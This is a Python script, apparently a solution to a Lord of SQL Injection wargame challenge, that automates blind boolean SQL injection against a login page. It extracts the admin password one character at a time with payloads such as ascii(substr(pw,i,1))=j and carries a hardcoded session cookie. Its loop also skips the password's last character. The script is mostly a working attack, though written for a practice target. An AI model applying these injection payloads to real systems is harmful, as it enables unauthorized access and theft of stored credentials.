from requests import Session, request

URL = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php"
session = {"PHPSESSID": "c8o4nup8pn2fn76vsh9mlrmrni"}

PWLength = 0
FLAG = ""


def lengthPW():
    global PWLength
    for i in range(1, 20):
        payload = f"?pw=' or id='admin' and length(pw)<{i}%23"
        res = request(method='GET', url=URL + payload, cookies=session)
        # print(f"[*] in progress {i}")

        if "Hello admin" in res.text:
            print("PW length is ::", i - 1)
            PWLength = i - 1
            break


def getPW():
    global PWLength
    global FLAG

    for i in range(1, PWLength):
        for j in range(48, 126):
            print(i, j)
            payload = f"?pw=' or id='admin' and ascii(substr(pw,{i},1))={j}%23"
            res = request(method='GET', url=URL + payload, cookies=session)

            if "Hello admin" in res.text:
                print(f"PW[{str(i)}] is :: {chr(j)}")
                FLAG = FLAG + chr(j)

    print(f"PW :: {FLAG}")


if __name__ == '__main__':
    lengthPW()
    getPW()
